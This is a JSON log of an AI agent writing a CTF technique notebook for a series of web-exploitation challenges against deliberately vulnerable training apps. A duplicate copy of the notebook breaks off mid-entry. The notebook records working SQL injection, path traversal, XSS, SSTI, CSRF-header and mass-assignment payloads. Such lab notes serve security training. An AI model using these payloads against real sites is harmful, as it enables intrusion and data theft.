{"type":"assistant","message":{"model":"claude-opus-5-5","id":"msg_011CgKFZuovHZNEQ3AMEeq2L","type":"message","role":"assistant","content":[{"type":"tool_use","id":"toolu_0129ZWmjorCGaZZhQdqjm3NW","name":"Write","input":{"file_path":"/home/testpwn/huntress-2026/reference/techniques/web.md","content":"# web — technique log (lane-days D01-D13 released; updated after every day)\n\nHow the lane has looked so far (observations, not guarantees):\n- **Late release, catch-up pace.** No web on calendar days 1-18. Cal. 19 released D01-D03, 20 D04-D05, 21 D06-D08,\n  22 D09-D10, 23 D11-D13 (GM ids `web-exploitation-day-NN-<slug>`; the slug is usually the title but not always: D07\n  \"Stored for Later\" = `...-day-07-stored-xss`; folder `challenges/<cal-day>/web-<title>`, so lane-day != folder day).\n  Expect 2-3 lane-days per calendar day (D14-D31 = 18 left for cal. 24-31). Each lane-day = ONE classic bug, named\n  by a title pun: D01 backup exposure \"Back Up a Minute\", D02 IDOR \"Permission to Slip\", D03 SQLi \"Query Me This\",\n  D04 path traversal \"Stay in Your Directory\", D05 missing function-level authz \"Administratively Speaking\", D06\n  reflected XSS \"Reflect Upon This\", D07 stored XSS \"Stored for Later\", D08 session fixation \"Session Impression\",\n  D09 CSRF \"Forged With Care\", D10 unrestricted upload \"Uploading Expectations\", D11 SSTI \"Template Temper\", D12\n  second-order SQLi \"Ask Again Later\", D13 mass assignment \"Posted Too Much\". Arc: info-disclosure -> access control\n  -> injection -> file read -> access control -> XSS x2 -> session -> CSRF -> upload -> SSTI -> second-order SQLi ->\n  mass assignment (server-side / API turn since D10; D10-D12 are \"injection, one level deeper\" sequels).\n- **No artifact: a live target.** `start` returns `result: preparing` until ready, then `targets: [{\"id\": \"Target N\",\n  \"url\": \"https://<48hex>.2026.huntress.ctf.games/\"}]`. Reachable directly from the host, behind Cloudflare. After\n  CORRECT every path returns `410 {\"state\":\"completed\"}`; an untimed target stops after 30 min idle.\n- **Contract is fixed:** `proof-N` \"Recover the proof from Target N.\", artifact `Target N`, `exact_text`, `trim`.\n  Answer = token `proof_<32 lowercase hex>` printed by the app. The prompt (one or two sentences) names the bug.\n- **Since D05 every app is the same kit** (\"A small, complete training app with one deliberately isolated security\n  boundary\"; framework banner = costume: Django, Laravel, Node, FastAPI, Spring Boot, Sinatra, NestJS). `GET\n  /api/clues` names everything: `framework`, `feature_route: /<word>-<hex6>`, usually `secondary_route:\n  /<word>-<hex6>`, `current_role: analyst`, plus ZERO or ONE concept key (`session_hint`, `callback_nonce`,\n  `moderator_data_route`, `receipt_route_template`, `preferences_route`, `render_route`+`preview_guide`+\n  `upload_policy`+`upload_shape`). D11-D13 had NO concept key (D11 not even `secondary_route`): the prompt + the\n  bare-route errors are then the only routing signal. Routes answer JSON errors that say what is missing\n  (`session_id_required`, `authenticated_login_required`, `browser_callback_required`, `signed_in_session_required`,\n  `invalid_destination`, `method_not_allowed`, `file_not_found`, `post_required` (405), `administrator_required`\n  (403)). Success = `{\"ok\":true,\"effect\":\"<snake_case>\",\"evidence\":\"proof_...\"}`, a concept-shaped JSON carrying the\n  proof (`evidence`, `rows[]`), or the proof inline in a rendered page (D10, D11).\n- **\"Browser\" checks are of two kinds.** D06 and D09: NO real browser -- the server judges by fetch-metadata headers\n  + Referer. D07: a REAL moderator bot visits stored content seconds (sometimes >12 s) later. Try headers first.\n- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, **3 since D08**); the prompt\n  describes only today's bug. Earlier bugs seen in Mastery so far: D01 (x3), D02 (x2), D04, D05 (D11-D13 composition\n  not logged: the solver answered all 3 targets in 4-6 s). Mastery targets often sit ~3-5 min in `preparing` (D12\n  189 s, D13 175 s; D11 7.5 s); singles / TT 4-10 s.\n- **A new class beats the generic seed unless the handler ships before TT.** D09, D10, D12, D13 TT all came back\n  `solver_incomplete` (13-41 s): solve.py had no handler for the new class. D11 is the counter-example: the single\n  worker wrote the `lib/web/handlers/day23_*.py` plugin BEFORE submitting -> TT correct first try (solve 5.2 s) and\n  Mastery 4.4 s. The orchestrator starts TT ~1 min after single CORRECT, before a separate codify worker finishes.\n\n## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)\n- **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-3 (Mastery). Rule: map question\n  `artifact` \"Target N\" to `targets[].id`, fallback Nth entry; never reuse a URL across attempts.\n- **Mastery composition / order**: earlier-day targets at any index; prompt is today's only. Rule: cheap recon on\n  every target (home, robots, /api/clues, /openapi.json), run the probes the recon hints first, the rest staged;\n  targets in threads. Import earlier solvers' `answer()` ONLY (day-21 `fallback()`s recurse into each other).\n- **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action` | `submit` |\n  `inspect`; secondary `callback` | `internal` | `status` | `result` | `audit` | `staff-<hex8>`; render (D10)\n  `account` | `internal` | `result`; D09 `preferences_route` fixed `/preferences`. Seen within one day: D12 secondary\n  `result` (single) -> `internal` (TT); D13 `audit` -> `internal`. Rule: pick routes by clue KEY role\n  (`feature_route`, `secondary_route`, `*_data_route`, `*_template`), never by the word in the value.\n- **Clue key set**: with a concept key (D06-D10) | only `feature_route`+`secondary_route` (D12, D13) | only\n  `feature_route` (D05, D11). Rule: no concept key -> classify from the prompt + bare GET of each route (`post_required`\n  = a POST sink; 403 `administrator_required` = privilege check; HTML `<pre>` echo = render sink).\n- **Request body encoding (D12, D13)**: POST-only routes accept form AND JSON with `{\"ok\":true,\"saved\":true}` /\n  `201 {\"ok\":true,\"profile\":{...}}`, but only the JSON body is bound (D12 form plant -> `rows: []`). Rule: send\n  JSON first (form second), every candidate field in one body.\n- **Backup exposure (D01)**: robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/`; file `environment-copy-<hex>\n  .json.bak` | `site-config-<hex6>.json.bak` (+ decoy `release-notes.txt`). Rule: depth-2 crawl, regex `proof_`.\n- **IDOR (D02)** foreign ids in `/api/history`. **SQLi (D03)** `('%..%')` wrapper -> tautologies over `'` `')` `'))`\n  `\"` + `--`/`#` (and quote-balanced, see cross-check). **LFI (D04)** every param whose value has `.`/`/` x `../`*10 +\n  prompt path, absolute, `....//`, `..%2f`, `php://filter`. **Access control (D05)** GET then POST every clue route.\n- **Board noun (D07)**: `/api/messages`+`/messages/{id}` | `/api/postcards`+`/postcards/{id}` -> from openapi/submit `url`.\n- **CSRF (D09)**: route hex, outside mailbox option (`review-NNNN@outside.example.invalid`), token sent or not (both\n  worked). Rule: parse every `<form>` on the clue page; submit the non-current external option cross-site.\n- **Upload (D10)**: route words + skin; \"txt + text/plain\" policy never enforced. Rule: routes by key, preview URL from\n  the upload response's `path`, template syntax from the guide's `<code>`, field `objective`.\n- **SSTI (D11)**: feature `/process-<hex6>`, param `template` (`message`, `q`, `name`, `text`, `input` rendered empty),\n  delimiter `{{..}}` evaluated while `${..}` / `*{..}` came back literal under a \"Spring Boot\" costume; context var\n  `objective`; other names -> Spring-style 500 JSON. TT + Mastery passed with the same handler. Rule: per candidate\n  param send one probe holding every delimiter family with distinct arithmetic (`{{49*1}}|${50*1}|...`), keep the\n  family whose number appears evaluated, then ask it for `objective` (then `proof`, `flag`).\n- **Second-order SQLi (D12)**: winning plant `x' OR '1'='1' -- ` (single) and `zz' OR 1=1 --` (TT), both JSON, every\n  common field at once (`name,q,query,note,label,title,value,filter,search,term,report,...`). Rule: plant the ladder\n  (quote-balanced, paren, `--`-terminated) as JSON then form, re-GET `secondary_route` after EACH plant.\n- **Mass assignment (D13)**: NestJS costume, echo only `display_name`; single and TT both passed with one JSON body\n  holding `display_name` + `role:\"admin\"|\"administrator\"`, `is_admin`, `isAdmin`, `admin`, `roles:[\"admin\"]`,\n  `access_level`, `permissions` (which key bound is unknown -- the echo hides it). State is server-side per target,\n  no cookie. Rule: bind the whole privilege set in one POST, then GET `secondary_route`.\n- **Proof carrier**: HTML text / `<pre>`, JSON `support_note` | `note` | `evidence` | `rows[]`, a receipt on a board\n  page. Rule: regex `proof_[0-9a-f]{32}` over every body -- never key on field names or on `effect`.\n\n## Recognition cues -> first move\n- `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without `--max-time`;\n  Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.\n- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece (param, cookie, login,\n  browser, POST, admin). No concept key -> the prompt's verb names the bug.\n- `Disallow:` -> D01 crawl. \"Signed in as\" + `/<things>/<id>` -> D02 IDOR. Search / \"database\" -> D03 tautology.\n  `?doc=` + \"stay inside / mounted at /path\" -> D04 traversal. \"staff-only door, just a sign\" -> D05 GET it.\n- \"repeats everything\", `callback_nonce` -> D06 reflect `<script>fetch('<cb>?nonce=N')</script>` via `?q=`, then GET\n  the callback with same-origin fetch-metadata. \"guestbook\", \"reviewer stops by\", `moderator_data_route` -> D07 stored\n  script fetch(data)->POST receipt; poll. \"plant your session\", `session_hint` -> D08 `?sid=<hint>`.\n- \"obeys whoever asks nicely -- even strangers\", form with hidden `csrf_token` -> D09 cross-site form submit.\n- \"upload form has standards. Low ones\", `upload_shape`/`render_route` -> D10 upload `.html` with `{{objective}}`.\n- \"template engine ... evaluates everything\", \"speak in expressions\", \"incantation\", page \"Rendered message\" with an\n  empty `<pre>` -> D11 SSTI: `GET <feature>?template={{7*7}}` (49), then `?template={{objective}}`.\n- \"plant your question inside the data and come back later\", \"delayed echo\", feature = `post_required`, secondary\n  returns `{\"rows\":[],\"effect\":...}` -> D12 second-order SQLi: POST JSON every field = `x' OR '1'='1' -- `, GET\n  secondary -> `rows` holds the private row.\n- \"the form only asked for your name. But the API binds whatever you hand it\", \"hand it a promotion\", feature\n  `post_required` + secondary 403 `administrator_required` -> D13 mass assignment: POST JSON `display_name` + every\n  privilege key, GET secondary -> `effect: bound_privileged_property` + `evidence`.\n- Proof regex hit = landed; an `effect` alone is NOT (D12 prints its effect with empty rows).\n\n## Day by day\n- **D01-D05 (cal. 19-20)**: D01 robots Disallow -> index -> `.json.bak` `support_note` (Mastery missed it with a\n  one-level crawl). D02 `/api/history` foreign id -> `GET /api/briefs/<id>`. D03 `/lookup?q=zz') OR 1=1 --` (plain\n  `' OR '1'='1` failed). D04 `reader.php?doc=../`*6+`run/huntress/objective.txt`; 51 s. D05 GET `/dispatch-<hex6>`\n  -> `effect: framework_authorization_bypassed`; 47 s.\n- **D06-D08 (cal. 21)**: D06 reflected XSS, server-judged: reflect `fetch('<cb>?nonce=N')` via `?q=`, then GET\n  `<secondary>?nonce=N` with `Sec-Fetch-Site: same-origin`/`Mode: cors`/`Dest: empty`, `Referer: <reflected URL>`,\n  `Origin`, `X-Callback-Nonce` -> `isolated_browser_callback`; 83 s; TT broke on routing by the word `callback`.\n  D07 stored XSS, real moderator bot: POST a `<script>` that fetches the data route with credentials and POSTs\n  `{evidence}` to the receipt route; poll `/messages/{id}`; 78 s; Mastery had `/api/postcards`, receipt after 12 s.\n  D08 session fixation: `GET /action-<hex6>?sid=<hint>` -> `Set-Cookie: arena_session=<hint>` -> GET secondary ->\n  `fixed_session_privilege_transfer`; 116 s; Mastery ~15 min (every solver raced on every target starved the app).\n- **D09-D10 (cal. 22)**: D09 CSRF judged by fetch-metadata: `/preferences` form (`destination` select, hidden\n  `csrf_token`); submit `?destination=review-NNNN%40outside.example.invalid` with `Sec-Fetch-Site: cross-site`,\n  `Mode: navigate`, `Dest: document`, foreign Referer -> `/api/preferences` `changed_across_sites:true` + `evidence`;\n  70 s. D10 upload: POST `{\"filename\":\"note.html\",\"content\":\"<p>{{objective}}</p>\",\"content_type\":\"text/html\"}` -> GET\n  the returned `path` -> proof in HTML; 58 s. Both TT `solver_incomplete` (~41 s generic race); Mastery 3.9-4.9 s.\n- **D11 Template Temper (cal. 23)** -- SSTI. Clues `{framework: \"Spring Boot\", current_role, feature_route:\n  /process-<hex6>}`, nothing else. Bare GET -> `<article><h1>Rendered message</h1><pre></pre></article>`. One probe\n  per param `a${7*7}b*{7*7}c{{7*7}}d`: only `template` rendered, as `a${7*7}b*{7*7}c49d`. `?template={{objective}}`\n  -> proof in `<pre>`; `{{T(java.lang.Runtime)}}` printed a class (SpEL-ish, RCE was never needed). Single CORRECT\n  105 s; the worker wrote the plugin handler before submitting -> TT CORRECT first try (15.8 s total, solve 5.2 s),\n  Mastery 3 targets 15.4 s.\n- **D12 Ask Again Later (cal. 23)** -- second-order SQLi. Clues `{framework: \"Sinatra\", feature_route: /submit-<hex6>,\n  secondary_route: /result-<hex6> | /internal-<hex6>}`. GET feature -> 405 `post_required`; any POST (form or JSON,\n  even `{}`) -> `{\"ok\":true,\"saved\":true}`; GET secondary runs the stored value in a quoted SQL literal ->\n  `{\"rows\":[...],\"effect\":\"delayed_query_revealed_private_row\"}`, effect printed even with `rows: []`. Form-encoded\n  plants in 25 field names -> `rows: []`; the same payload as JSON (`curl -X POST -H 'Content-Type:\n  application/json' -d '{\"name\":\"x'\"'\"' OR '\"'\"'1'\"'\"'='\"'\"'1'\"'\"' -- \",...}'`) -> `rows: [\"Ordinary workspace\n  note\",\"proof_...\"]`; a `\"`-quoted variant -> `rows: []`, an `x') OR 1=1 -- ` variant -> 500. TT winner `zz' OR 1=1 --`\n  (JSON). `--` comments DID work in both (the handler docstring claiming otherwise is wrong). Single CORRECT 83 s; TT\n  `solver_incomplete` 41 s (handler not yet written), live worker hand-solved; Mastery solve 6.4 s (189 s preparing).\n- **D13 Posted Too Much (cal. 23)** -- mass assignment. Clues `{framework: \"NestJS\", feature_route: /inspect-<hex6>,\n  secondary_route: /audit-<hex6> | /internal-<hex6>}`. GET feature -> 405 `post_required`; GET secondary -> 403\n  `administrator_required`. POST JSON `{\"display_name\":\"bob\",\"role\":\"admin\",\"is_admin\":true,\"admin\":true}` -> `201\n  {\"ok\":true,\"profile\":{\"display_name\":\"bob\"}}` (privileged keys silently bound, not echoed) -> GET secondary ->\n  `{\"ok\":true,\"effect\":\"bound_privileged_property\",\"evidence\":\"proof_...\"}`. Single CORRECT 59 s; TT\n  `solver_incomplete` 12.9 s (solve.py was a stub), live worker sent role/isAdmin/is_admin/admin/roles/access_level/\n  permissions in one body -> CORRECT; Mastery solve 4.6 s (175 s preparing).\n\n## GM answer conventions learned\n- Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.\n  Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`.\n- `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),\n  `fixed_session_privilege_transfer` (D08), `delayed_query_revealed_private_row` (D12, proof in `rows[]`),\n  `bound_privileged_property` (D13, proof in `evidence`). D09 `changed_across_sites:true` + `evidence`; D10, D11 proof\n  in rendered HTML; D07 in a moderator receipt.\n- `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed.\n\n## Pitfalls that cost time\n- Shipping a new day without its class handler: D09, D10, D12, D13 TT all `solver_incomplete`. Write the\n  `lib/web/handlers/dayNN_*.py` plugin (KEY_MAP + HANDLERS) BEFORE the single submit, like D11 did.\n- Treating `effect` as success: D12's reader prints its effect with `rows: []`. Success = proof regex.\n- Form-encoded bodies on JSON APIs: D12 ignored form fields (but answered `saved:true`). Send JSON first.\n- Trusting the echo: D13 echoes only `display_name`; bound privileges are invisible until the secondary route.\n- A 500 on `{{unknown}}` (D11 Spring JSON) means \"undefined variable\", not \"not injectable\"; `{{objective}}` worked.\n- Choosing routes by the WORD in a clue value -- words are re-dealt within a day (D12 result->internal, D13\n  audit->internal); use clue keys / openapi. Routing by prompt keywords in Mastery (earlier-day targets get today's\n  prompt). One-level crawls (D01 proof sits one link below the index). Solvers importing each other's `fallback()`.\n- Hammering one target with every earlier probe in parallel slows the app; recon-gate the probes.\n- Polling a bot-driven receipt for a fixed 12 s: the D07 moderator sometimes comes later.\n- Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs.\n- Trusting the app's stated policy (\"txt only\", \"token required\"): D09/D10 rules were decorative.\n- `curl` without `--max-time` is blocked by the hook; urllib's default UA can draw a Cloudflare 403.\n\n## reviewer cross-check (measured on a parallel agent; folded into the drivers)\n- **Blind SQLi oracle trap (D03).** `q` sits in an EVEN number of `col LIKE '%q%'` clauses, so `' OR '1'='1` and\n  `' OR '1'='2` BOTH return all rows. Oracle = quote balance: `nope' OR (<cond>) OR '1'='2` reduces WHERE to\n  `<cond>`; calibrate on `1=1`/`1=2`. SQLite; `summary LIKE char(112,114,111,111,102,37)` spells `'proof%'`.\n- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2; use >= 3 `../` into the prompt path.\n- **`control_unavailable` is TRANSIENT** (a 26.7 s hang on `op=start`; resend succeeded). Back off and re-send.\n"},"caller":{"type":"direct"}}],"container":null,"stop_reason":null,"stop_sequence":null,"stop_details":null,"usage":{"input_tokens":2,"cache_creation_input_tokens":1139,"cache_read_input_tokens":78087,"cache_creation":{"ephemeral_5m_input_tokens":0,"ephemeral_1h_input_tokens":1139},"output_tokens":6,"service_tier":"standard","inference_geo":"global","speed":"standard"},"input_transformations":[],"diagnostics":null,"context_management":null},"parent_tool_use_id":null,"session_id":"05381da5-85e0-49d3-87e4-724cb00f5f8b","uuid":"6262d93c-6d62-4f89-8561-50912651cec1","timestamp":"2026-10-23T13:33:20.483Z","request_id":"req_011CgKFZuU5RH3mrWKuJtmKB","wire_tool_inputs":{"toolu_0129ZWmjorCGaZZhQdqjm3NW":{"file_path":"/home/testpwn/huntress-2026/reference/techniques/web.md","content":"# web — technique log (lane-days D01-D13 released; updated after every day)\n\nHow the lane has looked so far (observations, not guarantees):\n- **Late release, catch-up pace.** No web on calendar days 1-18. Cal. 19 released D01-D03, 20 D04-D05, 21 D06-D08,\n  22 D09-D10, 23 D11-D13 (GM ids `web-exploitation-day-NN-<slug>`; the slug is usually the title but not always: D07\n  \"Stored for Later\" = `...-day-07-stored-xss`; folder `challenges/<cal-day>/web-<title>`, so lane-day != folder day).\n  Expect 2-3 lane-days per calendar day (D14-D31 = 18 left for cal. 24-31). Each lane-day = ONE classic bug, named\n  by a title pun: D01 backup exposure \"Back Up a Minute\", D02 IDOR \"Permission to Slip\", D03 SQLi \"Query Me This\",\n  D04 path traversal \"Stay in Your Directory\", D05 missing function-level authz \"Administratively Speaking\", D06\n  reflected XSS \"Reflect Upon This\", D07 stored XSS \"Stored for Later\", D08 session fixation \"Session Impression\",\n  D09 CSRF \"Forged With Care\", D10 unrestricted upload \"Uploading Expectations\", D11 SSTI \"Template Temper\", D12\n  second-order SQLi \"Ask Again Later\", D13 mass assignment \"Posted Too Much\". Arc: info-disclosure -> access control\n  -> injection -> file read -> access control -> XSS x2 -> session -> CSRF -> upload -> SSTI -> second-order SQLi ->\n  mass assignment (server-side / API turn since D10; D10-D12 are \"injection, one level deeper\" sequels).\n- **No artifact: a live target.** `start` returns `result: preparing` until ready, then `targets: [{\"id\": \"Target N\",\n  \"url\": \"https://<48hex>.2026.huntress.ctf.games/\"}]`. Reachable directly from the host, behind Cloudflare. After\n  CORRECT every path returns `410 {\"state\":\"completed\"}`; an untimed target stops after 30 min idle.\n- **Contract is fixed:** `proof-N` \"Recover the proof from Target N.\", artifact `Target N`, `exact_text`, `trim`.\n  Answer = token `proof_<32 lowercase hex>` printed by the app. The prompt (one or two sentences) names the bug.\n- **Since D05 every app is the same kit** (\"A small, complete training app with one deliberately isolated security\n  boundary\"; framework banner = costume: Django, Laravel, Node, FastAPI, Spring Boot, Sinatra, NestJS). `GET\n  /api/clues` names everything: `framework`, `feature_route: /<word>-<hex6>`, usually `secondary_route:\n  /<word>-<hex6>`, `current_role: analyst`, plus ZERO or ONE concept key (`session_hint`, `callback_nonce`,\n  `moderator_data_route`, `receipt_route_template`, `preferences_route`, `render_route`+`preview_guide`+\n  `upload_policy`+`upload_shape`). D11-D13 had NO concept key (D11 not even `secondary_route`): the prompt + the\n  bare-route errors are then the only routing signal. Routes answer JSON errors that say what is missing\n  (`session_id_required`, `authenticated_login_required`, `browser_callback_required`, `signed_in_session_required`,\n  `invalid_destination`, `method_not_allowed`, `file_not_found`, `post_required` (405), `administrator_required`\n  (403)). Success = `{\"ok\":true,\"effect\":\"<snake_case>\",\"evidence\":\"proof_...\"}`, a concept-shaped JSON carrying the\n  proof (`evidence`, `rows[]`), or the proof inline in a rendered page (D10, D11).\n- **\"Browser\" checks are of two kinds.** D06 and D09: NO real browser -- the server judges by fetch-metadata headers\n  + Referer. D07: a REAL moderator bot visits stored content seconds (sometimes >12 s) later. Try headers first.\n- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, **3 since D08**); the prompt\n  describes only today's bug. Earlier bugs seen in Mastery so far: D01 (x3), D02 (x2), D04, D05 (D11-D13 composition\n  not logged: the solver answered all 3 targets in 4-6 s). Mastery targets often sit ~3-5 min in `preparing` (D12\n  189 s, D13 175 s; D11 7.5 s); singles / TT 4-10 s.\n- **A new class beats the generic seed unless the handler ships before TT.** D09, D10, D12, D13 TT all came back\n  `solver_incomplete` (13-41 s): solve.py had no handler for the new class. D11 is the counter-example: the single\n  worker wrote the `lib/web/handlers/day23_*.py` plugin BEFORE submitting -> TT correct first try (solve 5.2 s) and\n  Mastery 4.4 s. The orchestrator starts TT ~1 min after single CORRECT, before a separate codify worker finishes.\n\n## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)\n- **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-3 (Mastery). Rule: map question\n  `artifact` \"Target N\" to `targets[].id`, fallback Nth entry; never reuse a URL across attempts.\n- **Mastery composition / order**: earlier-day targets at any index; prompt is today's only. Rule: cheap recon on\n  every target (home, robots, /api/clues, /openapi.json), run the probes the recon hints first, the rest staged;\n  targets in threads. Import earlier solvers' `answer()` ONLY (day-21 `fallback()`s recurse into each other).\n- **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action` | `submit` |\n  `inspect`; secondary `callback` | `internal` | `status` | `result` | `audit` | `staff-<hex8>`; render (D10)\n  `account` | `internal` | `result`; D09 `preferences_route` fixed `/preferences`. Seen within one day: D12 secondary\n  `result` (single) -> `internal` (TT); D13 `audit` -> `internal`. Rule: pick routes by clue KEY role\n  (`feature_route`, `secondary_route`, `*_data_route`, `*_template`), never by the word in the value.\n- **Clue key set**: with a concept key (D06-D10) | only `feature_route`+`secondary_route` (D12, D13) | only\n  `feature_route` (D05, D11). Rule: no concept key -> classify from the prompt + bare GET of each route (`post_required`\n  = a POST sink; 403 `administrator_required` = privilege check; HTML `<pre>` echo = render sink).\n- **Request body encoding (D12, D13)**: POST-only routes accept form AND JSON with `{\"ok\":true,\"saved\":true}` /\n  `201 {\"ok\":true,\"profile\":{...}}`, but only the JSON body is bound (D12 form plant -> `rows: []`). Rule: send\n  JSON first (form second), every candidate field in one body.\n- **Backup exposure (D01)**: robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/`; file `environment-copy-<hex>\n  .json.bak` | `site-config-<hex6>.json.bak` (+ decoy `release-notes.txt`). Rule: depth-2 crawl, regex `proof_`.\n- **IDOR (D02)** foreign ids in `/api/history`. **SQLi (D03)** `('%..%')` wrapper -> tautologies over `'` `')` `'))`\n  `\"` + `--`/`#` (and quote-balanced, see cross-check). **LFI (D04)** every param whose value has `.`/`/` x `../`*10 +\n  prompt path, absolute, `....//`, `..%2f`, `php://filter`. **Access control (D05)** GET then POST every clue route.\n- **Board noun (D07)**: `/api/messages`+`/messages/{id}` | `/api/postcards`+`/postcards/{id}` -> from openapi/submit `url`.\n- **CSRF (D09)**: route hex, outside mailbox option (`review-NNNN@outside.example.invalid`), token sent or not (both\n  worked). Rule: parse every `<form>` on the clue page; submit the non-current external option cross-site.\n- **Upload (D10)**: route words + skin; \"txt + text/plain\" policy never enforced. Rule: routes by key, preview URL from\n  the upload response's `path`, template syntax from the guide's `<code>`, field `objective`.\n- **SSTI (D11)**: feature `/process-<hex6>`, param `template` (`message`, `q`, `name`, `text`, `input` rendered empty),\n  delimiter `{{..}}` evaluated while `${..}` / `*{..}` came back literal under a \"Spring Boot\" costume; context var\n  `objective`; other names -> Spring-style 500 JSON. TT + Mastery passed with the same handler. Rule: per candidate\n  param send one probe holding every delimiter family with distinct arithmetic (`{{49*1}}|${50*1}|...`), keep the\n  family whose number appears evaluated, then ask it for `objective` (then `proof`, `flag`).\n- **Second-order SQLi (D12)**: winning plant `x' OR '1'='1' -- ` (single) and `zz' OR 1=1 --` (TT), both JSON, every\n  common field at once (`name,q,query,note,label,title,value,filter,search,term,report,...`). Rule: plant the ladder\n  (quote-balanced, paren, `--`-terminated) as JSON then form, re-GET `secondary_route` after EACH plant.\n- **Mass assignment (D13)**: NestJS costume, echo only `display_name`; single and TT both passed with one JSON body\n  holding `display_name` + `role:\"admin\"|\"administrator\"`, `is_admin`, `isAdmin`, `admin`, `roles:[\"admin\"]`,\n  `access_level`, `permissions` (which key bound is unknown -- the echo hides it). State is server-side per target,\n  no cookie. Rule: bind the whole privilege set in one POST, then GET `secondary_route`.\n- **Proof carrier**: HTML text / `<pre>`, JSON `support_note` | `note` | `evidence` | `rows[]`, a receipt on a board\n  page. Rule: regex `proof_[0-9a-f]{32}` over every body -- never key on field names or on `effect`.\n\n## Recognition cues -> first move\n- `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without `--max-time`;\n  Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.\n- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece (param, cookie, login,\n  browser, POST, admin). No concept key -> the prompt's verb names the bug.\n- `Disallow:` -> D01 crawl. \"Signed in as\" + `/<things>/<id>` -> D02 IDOR. Search / \"database\" -> D03 tautology.\n  `?doc=` + \"stay inside / mounted at /path\" -> D04 traversal. \"staff-only door, just a sign\" -> D05 GET it.\n- \"repeats everything\", `callback_nonce` -> D06 reflect `<script>fetch('<cb>?nonce=N')</script>` via `?q=`, then GET\n  the callback with same-origin fetch-metadata. \"guestbook\", \"reviewer stops by\", `moderator_data_route` -> D07 stored\n  script fetch(data)->POST receipt; poll. \"plant your session\", `session_hint` -> D08 `?sid=<hint>`.\n- \"obeys whoever asks nicely -- even strangers\", form with hidden `csrf_token` -> D09 cross-site form submit.\n- \"upload form has standards. Low ones\", `upload_shape`/`render_route` -> D10 upload `.html` with `{{objective}}`.\n- \"template engine ... evaluates everything\", \"speak in expressions\", \"incantation\", page \"Rendered message\" with an\n  empty `<pre>` -> D11 SSTI: `GET <feature>?template={{7*7}}` (49), then `?template={{objective}}`.\n- \"plant your question inside the data and come back later\", \"delayed echo\", feature = `post_required`, secondary\n  returns `{\"rows\":[],\"effect\":...}` -> D12 second-order SQLi: POST JSON every field = `x' OR '1'='1' -- `, GET\n  secondary -> `rows` holds the private row.\n- \"the form only asked for your name. But the API binds whatever you hand it\", \"hand it a promotion\", feature\n  `post_required` + secondary 403 `administrator_required` -> D13 mass assignment: POST JSON `display_name` + every\n  privilege key, GET secondary -> `effect: bound_privileged_property` + `evidence`.\n- Proof regex hit = landed; an `effect` alone is NOT (D12 prints its effect with empty rows).\n\n## Day by day\n- **D01-D05 (cal. 19-20)**: D01 robots Disallow -> index -> `.json.bak` `support_note` (Mastery missed it with a\n  one-level crawl). D02 `/api/history` foreign id -> `GET /api/briefs/<id>`. D03 `/lookup?q=zz') OR 1=1 --` (plain\n  `' OR '1'='1` failed). D04 `reader.php?doc=../`*6+`run/huntress/objective.txt`; 51 s. D05 GET `/dispatch-<hex6>`\n  -> `effect: framework_authorization_bypassed`; 47 s.\n- **D06-D08 (cal. 21)**: D06 reflected XSS, server-judged: reflect `fetch('<cb>?nonce=N')` via `?q=`, then GET\n  `<secondary>?nonce=N` with `Sec-Fetch-Site: same-origin`/`Mode: cors`/`Dest: empty`, `Referer: <reflected URL>`,\n  `Origin`, `X-Callback-Nonce` -> `isolated_browser_callback`; 83 s; TT broke on routing by the word `callback`.\n  D07 stored XSS, real moderator bot: POST a `<script>` that fetches the data route with credentials and POSTs\n  `{evidence}` to the receipt route; poll `/messages/{id}`; 78 s; Mastery had `/api/postcards`, receipt after 12 s.\n  D08 session fixation: `GET /action-<hex6>?sid=<hint>` -> `Set-Cookie: arena_session=<hint>` -> GET secondary ->\n  `fixed_session_privilege_transfer`; 116 s; Mastery ~15 min (every solver raced on every target starved the app).\n- **D09-D10 (cal. 22)**: D09 CSRF judged by fetch-metadata: `/preferences` form (`destination` select, hidden\n  `csrf_token`); submit `?destination=review-NNNN%40outside.example.invalid` with `Sec-Fetch-Site: cross-site`,\n  `Mode: navigate`, `Dest: document`, foreign Referer -> `/api/preferences` `changed_across_sites:true` + `evidence`;\n  70 s. D10 upload: POST `{\"filename\":\"note.html\",\"content\":\"<p>{{objective}}</p>\",\"content_type\":\"text/html\"}` -> GET\n  the returned `path` -> proof in HTML; 58 s. Both TT `solver_incomplete` (~41 s generic race); Mastery 3.9-4.9 s.\n- **D11 Template Temper (cal. 23)** -- SSTI. Clues `{framework: \"Spring Boot\", current_role, feature_route:\n  /process-<hex6>}`, nothing else. Bare GET -> `<article><h1>Rendered message</h1><pre></pre></article>`. One probe\n  per param `a${7*7}b*{7*7}c{{7*7}}d`: only `template` rendered, as `a${7*7}b*{7*7}c49d`. `?template={{objective}}`\n  -> proof in `<pre>`; `{{T(java.lang.Runtime)}}` printed a class (SpEL-ish, RCE was never needed). Single CORRECT\n  105 s; the worker wrote the plugin handler before submitting -> TT CORRECT first try (15.8 s total, solve 5.2 s),\n  Mastery 3 targets 15.4 s.\n- **D12 Ask 